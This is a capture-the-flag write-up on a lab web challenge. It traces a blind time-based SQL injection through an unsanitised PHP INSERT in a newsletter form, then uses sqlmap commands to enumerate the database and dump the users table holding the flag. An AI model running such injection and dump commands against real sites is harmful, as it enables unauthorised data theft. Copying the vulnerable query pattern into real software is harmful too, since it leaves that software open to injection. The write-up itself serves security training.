# Web: Consult Pros

The Consult Pros agency has hired you to pentest their portfolio website to discover any sensitive security issues they might have on their platform. Can you review their application and find out any vulnerabilities?

**Target**: 104.248.162.85:31489

---
First of all we inspect the files included in the resource. We observe that there is a local SQL database (MariaDB) with some tables:

- Subscribers (id, email, subscribedat, pk) -> only the email is needed to create a new record, the other fields are generated automatically.
- Users (id, username, password, pk)

The IDs are auto-incremental integer numbers. Also, there is a default user included in the table `users`: `'admin', 'HTB{f4k3_fl4g_f0r_t3st1ng}'`. That gave us the clue that the flag we are looking for is in that table.

Now we are going to inspect the traffic with Burp. First of all, we update the scope so that only the requests/responses from or to the target are intercepted. To continue we inspect the web page. It is a simple web page with some auto-referenced hrefs. At the end of the page there is a form to subscribe to the newsletter. Maybe we can do somekind of injection with in this form. Let's inspect the request.

```http
POST /subscribe HTTP/1.1
Host: 104.248.162.85:31489
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://104.248.162.85:31489
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://104.248.162.85:31489/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=test%40email.com


HTTP/1.1 302 Found
Server: nginx
Date: Wed, 21 Sep 2022 12:22:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Location: /?success=true&msg=Email subscribed successfully!
Content-Length: 0



GET /?success=true&msg=Email%20subscribed%20successfully! HTTP/1.1
Host: 104.248.162.85:31489
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://104.248.162.85:31489/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
A 'success' message appears in the page before it is refeshed, but we cannot see our input reflected in the page. Thus it seems to be some kind of blind injection. We need more information to know how can we trick the server to inject code.

When we inspect the source code of the page, we see that `SubsController.php` calls the function `$subscriber = new SubscriberModel; $subscribed = $subscriber->subscribe($email);`, where the email is a parameter included in the POST request (`$email = $_POST['email'];`).

In the file `SubscriberModel.php` the insertion into the DB is done (`return $this->database->query("INSERT INTO subscribers(email) VALUES('$email')");`). No sanitization at all! Therefore, all the clues point out to a blind SQL injection.


Vemos que el parametro email se inyecta entre comillas simples
We observed that the parameter 'email' is inyected within simple quotes (`INSERT INTO subscribers(email) VALUES('$email')");`) so we need to escape them ([port-swigger blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)).

After some manual test we decide to use the tool `sqlmap`, a tool that allows to detect SQL injectable fields and also to exploit them, being able to retrive information from the database. When we execute it, it begins by testing if the fields/forms are injectable. They are! More specifically, time-based SQL injection.


First we will get the name of the current DB. It will be useful for further commands.
```
python3 sqlmap -u http://104.248.162.85:31489/ --data="email=test33@gmail.com" -p email --current-db

[...]

Database: consult
```

Then we list all the tables included in this DB: 
```
python3 sqlmap -u http://104.248.162.85:31489/ --data="email=test33@gmail.com" -p email -D consult --tables

[...]

2 tables: `subscribers` and `users`
```

Lets dump the `users` table, according to o ur first assumption:
```
python3 sqlmap.py -v -u http://104.248.162.85:31489/subscribe --data="email=test33@gmail.com" -p email -D consult -T users --dump

Database: consult
Table: users
[1 entry]
+----+-------------------------------+----------+
| id | password                      | username |
+----+-------------------------------+----------+
| 1  | HTB{1nj3c7_1n_4ll_HTTP_v3rb5} | admin    |
+----+-------------------------------+----------+
```

Finally, we got the flag.

